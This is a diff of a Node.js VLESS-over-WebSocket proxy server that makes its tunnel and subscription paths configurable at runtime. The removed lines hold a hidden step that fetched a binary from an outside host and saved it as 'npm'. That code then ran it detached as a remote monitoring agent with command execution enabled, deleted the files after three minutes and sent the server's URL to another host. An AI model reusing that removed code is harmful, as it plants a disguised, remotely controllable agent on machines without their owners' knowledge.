@@ -1,14 +1,11 @@
 #!/usr/bin/env node
 
-const os = require('os');
 const http = require('http');
 const fs = require('fs');
 const axios = require('axios');
 const net = require('net');
 const path = require('path');
 const crypto = require('crypto');
-const { Buffer } = require('buffer');
-const { exec, execSync } = require('child_process');
 const { WebSocket, createWebSocketStream } = require('ws');
 
 const storage = require('./localManagement');
@@ -18,35 +15,33 @@ storage.initStorage();
 
 let config = storage.loadConfig();
 const UUID = process.env.UUID || config.uuid || '5efabea4-f6d4-91fd-b8f0-17e004c89c60';
-const NEZHA_SERVER = process.env.NEZHA_SERVER || config.nezhaServer || '';
-const NEZHA_PORT = process.env.NEZHA_PORT || config.nezhaPort || '';
-const NEZHA_KEY = process.env.NEZHA_KEY || config.nezhaKey || '';
 const DOMAIN = process.env.DOMAIN || config.domain || '';
-const AUTO_ACCESS = String(process.env.AUTO_ACCESS ?? config.autoAccess ?? false) === 'true' || config.autoAccess === true;
 const WSPATH = process.env.WSPATH || (config.path ? config.path.replace(/^\//, '') : UUID.slice(0, 8));
 const SUB_PATH = process.env.SUB_PATH || config.subPath || 'sub';
-const NAME = process.env.NAME || config.name || '';
-const PORT = process.env.PORT || 3000;
+const PORT = Number(process.env.PORT || 7860);
 
 let uuid = UUID.replace(/-/g, '');
 let CurrentDomain = DOMAIN;
-let Tls = DOMAIN ? 'tls' : 'none';
 let CurrentPort = DOMAIN ? 443 : PORT;
-let ISP = '';
-
 const DNS_SERVERS = ['8.8.4.4', '1.1.1.1'];
 
 function reloadConfig() {
   config = storage.loadConfig();
   CurrentDomain = config.domain || DOMAIN || CurrentDomain;
+  uuid = String(config.uuid || UUID).replace(/-/g, '');
+}
+
+function getRuntimeSubPath() {
+  return String(config.subPath || SUB_PATH || 'sub').replace(/^\/+/, '');
+}
+
+function getRuntimeWsPath() {
+  const p = String(config.path || `/${WSPATH}` || '/ws');
+  return p.startsWith('/') ? p : `/${p}`;
 }
 
 function isBlockedDomain(host) {
   return sub.isBlockedDomain(host);
-}
-
-async function getisp() {
-  ISP = await sub.getISP();
 }
 
 async function getip() {
@@ -55,16 +50,13 @@ async function getip() {
     try {
       const ip = await sub.getPublicIP();
       CurrentDomain = ip;
-      Tls = 'none';
       CurrentPort = PORT;
     } catch (e) {
       CurrentDomain = 'change-your-domain.com';
-      Tls = 'tls';
       CurrentPort = 443;
     }
   } else {
     CurrentDomain = config.domain || DOMAIN;
-    Tls = 'tls';
     CurrentPort = 443;
   }
 }
@@ -137,7 +129,7 @@ async function resolveHost(host) {
 }
 
 function buildExpectedPath() {
-  return `/${WSPATH}`;
+  return getRuntimeWsPath();
 }
 
 function handleVlsConnection(ws, msg) {
@@ -352,15 +344,18 @@ const httpServer = http.createServer(async (req, res) => {
     }
   }
 
-  if (url.pathname === `/${SUB_PATH}`) {
-    await getisp();
+  if (url.pathname === `/${getRuntimeSubPath()}`) {
     await getip();
+    const addTxt = storage.loadAddTxt();
     const base64Content = await sub.generateSubscription({
       uuid: config.uuid || UUID,
       domain: CurrentDomain,
       path: config.path || `/${WSPATH}`,
       name: config.name || '',
-    }, CurrentDomain, CurrentPort);
+      sni: config.sni || config.domain || CurrentDomain,
+      hostHeader: config.hostHeader || config.domain || CurrentDomain,
+      subscription: config.subscription || {},
+    }, CurrentDomain, CurrentPort, addTxt);
     return sendText(res, base64Content);
   }
 
@@ -431,7 +426,8 @@ const wss = new WebSocket.Server({ server: httpServer });
 
 wss.on('connection', (ws, req) => {
   const url = req.url || '';
-  const expectedPath = `/${WSPATH}`;
+  reloadConfig();
+  const expectedPath = buildExpectedPath();
   if (!url.startsWith(expectedPath)) {
     ws.close();
     return;
@@ -454,103 +450,6 @@ wss.on('connection', (ws, req) => {
   }).on('error', () => {});
 });
 
-const getDownloadUrl = () => {
-  const arch = os.arch();
-  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
-    return 'https://arm64.ssss.nyc.mn/v1';
-  }
-  return 'https://amd64.ssss.nyc.mn/v1';
-};
-
-const downloadFile = async () => {
-  const cfg = storage.loadConfig();
-  if (!cfg.nezhaServer && !cfg.nezhaKey) return;
-  try {
-    const url = getDownloadUrl();
-    const response = await axios({ method: 'get', url, responseType: 'stream' });
-    const writer = fs.createWriteStream('npm');
-    response.data.pipe(writer);
-    return new Promise((resolve, reject) => {
-      writer.on('finish', () => {
-        exec('chmod +x npm', err => err ? reject(err) : resolve());
-      });
-      writer.on('error', reject);
-    });
-  } catch (err) {
-    throw err;
-  }
-};
-
-const runnz = async () => {
-  const cfg = storage.loadConfig();
-  if (!cfg.nezhaServer && !cfg.nezhaKey) return;
-
-  try {
-    const status = execSync('ps aux | grep -v "grep" | grep "./[n]pm"', { encoding: 'utf-8' });
-    if (status.trim() !== '') return;
-  } catch {}
-
-  await downloadFile();
-  let command = '';
-  const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
-
-  if (cfg.nezhaServer && cfg.nezhaPort && cfg.nezhaKey) {
-    const NEZHA_TLS = tlsPorts.includes(String(cfg.nezhaPort)) ? '--tls' : '';
-    command = `setsid nohup ./npm -s ${cfg.nezhaServer}:${cfg.nezhaPort} -p ${cfg.nezhaKey} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
-  } else if (cfg.nezhaServer && cfg.nezhaKey) {
-    if (!cfg.nezhaPort) {
-      const port = cfg.nezhaServer.includes(':') ? cfg.nezhaServer.split(':').pop() : '';
-      const NZ_TLS = tlsPorts.includes(port) ? 'true' : 'false';
-      const configYaml = `client_secret: ${cfg.nezhaKey}
-debug: false
-disable_auto_update: true
-disable_command_execute: false
-disable_force_update: true
-disable_nat: false
-disable_send_query: false
-gpu: false
-insecure_tls: true
-ip_report_period: 1800
-report_delay: 4
-server: ${cfg.nezhaServer}
-skip_connection_count: true
-skip_procs_count: true
-temperature: false
-tls: ${NZ_TLS}
-use_gitee_to_upgrade: false
-use_ipv6_country_code: false
-uuid: ${UUID}`;
-      fs.writeFileSync('config.yaml', configYaml);
-    }
-    command = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;
-  } else {
-    return;
-  }
-
-  try {
-    exec(command, { shell: '/bin/bash' }, () => {});
-  } catch {}
-};
-
-async function addAccessTask() {
-  const cfg = storage.loadConfig();
-  if (!AUTO_ACCESS || !cfg.domain) return;
-  try {
-    await axios.post('https://oooo.serv00.net/add-url', {
-      url: `https://${cfg.domain}/${cfg.subPath || SUB_PATH}`
-    }, {
-      headers: { 'Content-Type': 'application/json' }
-    });
-  } catch {}
-}
-
-const delFiles = () => {
-  ['npm', 'config.yaml'].forEach(file => fs.unlink(file, () => {}));
-};
-
 httpServer.listen(PORT, () => {
-  runnz();
-  setTimeout(delFiles, 180000);
-  addAccessTask();
   console.log(`Server is running on port ${PORT}`);
 });
